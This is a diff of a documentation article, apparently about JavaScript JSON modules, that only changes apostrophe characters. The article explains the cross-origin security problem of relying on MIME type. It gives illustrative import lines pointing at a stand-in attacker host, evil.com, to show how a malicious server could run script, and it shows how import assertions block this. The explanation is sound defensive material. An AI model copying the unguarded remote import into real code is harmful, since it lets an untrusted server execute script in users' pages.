@@ -25,7 +25,7 @@ console.log(json.answer); // 42
 
 ## Background: JSON modules and MIME type
 
-A natural question to ask is why a JSON module couldn't simply be imported like this:
+A natural question to ask is why a JSON module couldn’t simply be imported like this:
 
 ```javascript
 import json from './foo.json';
@@ -33,11 +33,11 @@ import json from './foo.json';
 
 The web platform checks the MIME type of a module resource for validity prior to executing it, and in theory this MIME type could also be used to determine whether to treat the resource as a JSON or as a JavaScript module.
 
-But, there's a [security issue](https://github.com/w3c/webcomponents/issues/839) with relying on the MIME type alone.
+But, there’s a [security issue](https://github.com/w3c/webcomponents/issues/839) with relying on the MIME type alone.
 
-Modules can be imported cross-origin, and a developer might import a JSON module from a third-party source. They might consider this to be basically safe even from an untrusted third-party as long as the JSON is properly sanitized, since importing JSON won't execute script.
+Modules can be imported cross-origin, and a developer might import a JSON module from a third-party source. They might consider this to be basically safe even from an untrusted third-party as long as the JSON is properly sanitized, since importing JSON won’t execute script.
 
-However, third-party script can actually execute in this scenario because the third-party server could unexpectedly reply with a JavaScript MIME type and a malicious JavaScript payload, running code in the importer's domain.
+However, third-party script can actually execute in this scenario because the third-party server could unexpectedly reply with a JavaScript MIME type and a malicious JavaScript payload, running code in the importer’s domain.
 
 ```javascript
 // Executes JS if evil.com responds with
@@ -45,9 +45,9 @@ However, third-party script can actually execute in this scenario because the th
 import data from 'https://evil.com/data.json';
 ```
 
-File extensions can't be used to make a module type determination because they [aren't a reliable indicator of content type on the web](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md). So instead, we use import assertions to indicate the expected module type and prevent this escalation-of-privilege pitfall.
+File extensions can’t be used to make a module type determination because they [aren’t a reliable indicator of content type on the web](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md). So instead, we use import assertions to indicate the expected module type and prevent this escalation-of-privilege pitfall.
 
-When a developer wants to import a JSON module, they must use an import assertion to specify that it's supposed to be JSON. The import will fail if the MIME type received from the network doesn't match the expected type:
+When a developer wants to import a JSON module, they must use an import assertion to specify that it’s supposed to be JSON. The import will fail if the MIME type received from the network doesn’t match the expected type:
 
 ```javascript
 // Fails if evil.com responds with a non-JSON MIME type.
@@ -71,7 +71,7 @@ const jsonModule = await import('./foo.json', {
 console.log(jsonModule.default.answer); // 42
 ```
 
-The JSON content is the default export of the module, so it's referenced through the `default` property on the object returned from `import()`.
+The JSON content is the default export of the module, so it’s referenced through the `default` property on the object returned from `import()`.
 
 ## Conclusion
 
